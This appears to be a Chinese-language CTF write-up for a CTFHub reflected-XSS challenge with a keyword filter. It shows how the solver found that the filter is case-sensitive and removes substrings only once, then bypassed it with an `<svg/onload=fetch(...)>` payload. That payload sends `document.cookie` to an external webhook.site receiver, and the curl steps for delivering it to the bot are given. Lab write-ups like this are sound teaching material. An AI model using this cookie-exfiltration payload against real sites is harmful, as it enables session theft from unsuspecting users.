---
layout: writeup
tags: [ctfhub]

title: "CTFHub CTF Writeup - 过滤关键词"
date: 2026-10-28

skill: "web-xss/过滤关键词"
completed: true
---

# CTFHub Writeup - 过滤关键词

## 题目类型

Web

## 题目描述

XSS 关键词过滤
What's your name
CTFHub
Hello, CTFHub
Send URL to Bot
URL


## 解题过程

<br>1. 先访问 \`$BASE/\`，服务端返回 302，\`Location: /?name=CTFHub\`；再请求 \`/?name=abc\`，响应中的 \`Hello,\` 行显示 \`\<h1\>Hello, abc\</h1\>\`。这说明 \`name\` 被原样拼进 \`\<h1\>\`，没有 HTML 转义，页面还保留了向 \`/submit\` 投递 bot 的接口。
<br>2. 随后用一组测试串探测过滤规则：小写 \`\<script\>alert(1)\</script\>\` 输出为 \`\<\>alert(1)\</\>\`；小写 \`\<img/src=x/onerror=alert(1)\>\` 输出为 \`\</src=x/=alert(1)\>\`；\`xxscriptyy\` 输出为 \`xxyy\`，说明 \`script\`、\`img\`、\`onerror\` 等小写子串被直接删除。\`\<SCRIPT\>\`、\`\<ScRiPt\>\` 原样保留，\`\<svg/onload=alert(1)\>\` 也完整保留，而 \`\<scr\<script\>ipt\>\` 变成 \`\<scr\<\>ipt\>\`，显示过滤是单次子串删除且区分大小写。
<br>3. 根据探测结果，选择不含小写 \`script\`、\`img\`、\`onerror\` 的 payload：\`\<svg/onload=fetch('https://webhook.site/\<uuid\>/'+encodeURIComponent(document.cookie))\>\`，并用 \`$payload.Contains('script')\`、\`$payload.Contains('img')\`、\`$payload.Contains('onerror')\` 自检均为 False。
<br>4. 通过 \`curl.exe -X POST\` 向 \`https://webhook.site/token\` 创建 webhook 接收端，并带上 JSON 请求头与空对象请求体；返回 uuid \`07cc1cc8-9e0a-421a-a8f9-9ca94cd89c0b\`。
<br>5. 将接收端地址拼入 payload，使用 \`curl.exe -G --data-urlencode\` 生成目标 URL，并请求该 URL。响应中的 \`Hello,\` 行原样回显完整 payload，说明 \`\<svg/onload=...\>\` 没有被二次过滤。
<br>6. 把目标 URL 写入 JSON 请求体，POST 到 \`$BASE/submit\`；服务端返回 code 为 0、msg 为 Successfully 的 JSON，HTTP 状态为 200。
<br>7. 等待约 10 秒后查询 webhook 请求记录，命中一条 \`HeadlessChrome/112.0.5615.138\` 的请求，其 URL 为 \`https://webhook.site/07cc1cc8-9e0a-421a-a8f9-9ca94cd89c0b/flag%3Dctfhub%7Bd0f227b791f188786e582cfe%7D\`。URL 解码得到 \`flag=ctfhub\{d0f227b791f188786e582cfe\}\`。

## 其他方法

记录中还提到黑名单只认小写，\`\<Script\>fetch(...)\</Script\>\` 可能也能绕过；该备选 payload 未实际提交，是否成功未验证。


## 疑问与解答

### 1.

<br>问题：为什么 \`\<img src=x onerror=...\>\` 被删掉后，\`\<svg/onload=...\>\` 还能执行？
<br>解答：本题服务端按小写子串删除 \`script\`、\`img\`、\`onerror\`，所以包含这些子串的标签或属性会被破坏；\`svg\` 和 \`onload\` 不在已探测到的黑名单中，浏览器解析 \`\<svg onload=...\>\` 时会把它作为 SVG 元素并在加载时触发事件，因此 payload 可以执行。

### 2.

<br>问题：为什么黑名单区分大小写会形成绕过？
<br>解答：HTML 标签名和属性名在浏览器解析时通常不区分大小写，\`\<SCRIPT\>\` 与 \`\<script\>\` 都能被识别；如果过滤只删除小写 \`script\` 等子串，而保留 \`\<SCRIPT\>\`、\`\<ScRiPt\>\`，就可能利用大小写变体绕过。本题实测中大小写混合形式确实原样保留。

### 3.

<br>问题：为什么投递 URL 后要去 webhook 看请求？
<br>解答：反射型 XSS 的 payload 需要在受害者浏览器中执行；本题的 bot 会访问提交的 URL，若 \`name\` 参数原样进入页面，\`\<svg onload\>\` 会在 bot 的页面上下文执行，把 \`document.cookie\` 编码后作为请求路径发到 webhook，从而外带 flag。查询 webhook 记录即可看到 bot 发出的请求。


## 本题的核心逻辑：


<br>题目是反射型 XSS：\`name\` 被直接拼进 \`\<h1\>\`，没有转义；服务端用区分大小写的子串黑名单删除 \`script\`、\`img\`、\`onerror\`，而且只做单次替换。绕过点不是把关键词拼回去，而是换用未被过滤的标签和事件，例如 \`\<svg/onload=...\>\`，使 payload 中不出现被禁的小写子串。

<br>bot 访问提交的 URL 后，payload 在目标源执行，将 \`document.cookie\` 通过 \`fetch\` 发到外部 webhook；记录中出现 HeadlessChrome 请求并携带 URL 编码的 flag，说明 XSS 成功在 bot 上下文执行并完成外带。


## 笔记

这道题主要学习了：

<br>1. 反射型 XSS 的判定要从响应上下文入手：参数是否进入 HTML、是否被转义、能否闭合或新增标签与事件。本题的 \`name\` 直接进入 \`\<h1\>\`，因此具备执行条件。
<br>2. 黑名单过滤要关注匹配粒度：是否区分大小写、是否只做一次子串删除、是否覆盖标签名和事件名。本题中 \`script\`、\`img\`、\`onerror\` 被删，但 \`svg\` 与 \`onload\` 未覆盖，换标签与事件即可绕过。
<br>3. 外带数据时要保证 payload 不触发过滤，并选一个可观测的接收端；bot 请求记录中的 User-Agent、Referer 和 URL 能帮助确认执行上下文与数据是否正确编码。
